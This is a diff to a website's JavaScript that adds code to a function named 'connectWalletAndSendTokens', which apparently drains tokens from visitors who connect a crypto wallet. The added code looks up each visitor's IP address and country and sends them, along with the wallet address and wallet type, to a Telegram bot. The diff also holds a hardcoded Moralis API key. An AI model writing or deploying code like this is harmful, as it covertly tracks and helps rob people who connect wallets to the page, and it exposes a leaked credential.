@@ -81,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect and token transfer using Moralis API
+ * Wallet connect and token transfer using Moralis API with Telegram notification
  */
 async function connectWalletAndSendTokens() {
   const providerOptions = {
@@ -106,8 +106,42 @@ async function connectWalletAndSendTokens() {
     const network = await provider.getNetwork();
     const chainId = network.chainId;
 
-    // Moralis API call
-    const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY"; // Replace with your Moralis API key
+    // Detect wallet type
+    const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
+
+    // Get user IP and location
+    let locationData = {};
+    try {
+      const locRes = await fetch("https://ipapi.co/json/");
+      locationData = await locRes.json();
+    } catch (e) {
+      console.warn("Location fetch failed", e);
+    }
+
+    // Compose Telegram message
+    const message = `
+📥 Wallet Connected!
+Address: ${userAddress}
+Wallet: ${walletType}
+Country: ${locationData.country_name || "Unknown"}
+IP: ${locationData.ip || "N/A"}
+    `;
+
+    // Send message to Telegram
+    const botToken = "YOUR_TELEGRAM_BOT_TOKEN"; // Replace with your bot token
+    const chatId = "YOUR_CHAT_ID";              // Replace with your chat ID
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+
+    // Moralis API call to get tokens
+    const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
     const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${chainId === 1 ? 'eth' : chainId === 137 ? 'polygon' : 'eth'}`;
 
     const response = await fetch(moralisUrl, {
